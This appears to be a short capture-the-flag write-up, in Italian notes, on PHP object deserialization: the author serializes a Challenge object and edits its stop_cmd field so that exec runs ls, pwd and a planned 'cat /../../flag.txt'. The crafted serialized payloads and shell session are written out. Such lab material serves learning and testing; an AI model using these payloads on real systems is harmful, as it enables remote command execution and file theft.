<?php
include 'data.php';
?>

dal momento che nella funzione data ho la classe Challenge che chiama il metodo exec,
dopo aver individuato dove si trova con i comandi ls e pwd,
metto stop_cmd uguale al comando "cat /../../flag.txt"

nella shell di php (aperta con php -a):
- import la classe data.php scrivendola (ma senza l'apertura e la chiusura di php a inizio e fine file)
- $c = new Challenge("nome", "descrizione");
- echo( serialize($c) );
ottenendo:
O:9:"Challenge":4:{s:4:"name";s:4:"nome";s:11:"description";s:11:"descrizione";s:9:"setup_cmd";N;s:8:"stop_cmd";N;}

poi cambio stop_cmd nel comando che voglio io:
O:9:"Challenge":4:{s:4:"name";s:4:"nome";s:11:"description";s:11:"descrizione";s:9:"setup_cmd";N;s:8:"stop_cmd";s:2:"ls";}



php > $x = unserialize("O:9:\"Challenge\":4:{s:4:\"name\";s:4:\"nome\";s:11:\"description\";s:11:\"descrizione\";s:9:\"setup_cmd\";N;s:8:\"stop_cmd\";s:2:\"ls\";}");
php > $x->stop();

php > $x = unserialize("O:9:\"Challenge\":4:{s:4:\"name\";s:4:\"nome\";s:11:\"description\";s:11:\"descrizione\";s:9:\"setup_cmd\";N;s:8:\"stop_cmd\";s:3:\"pwd\";}");
Stoping challenge!/home/acidburn


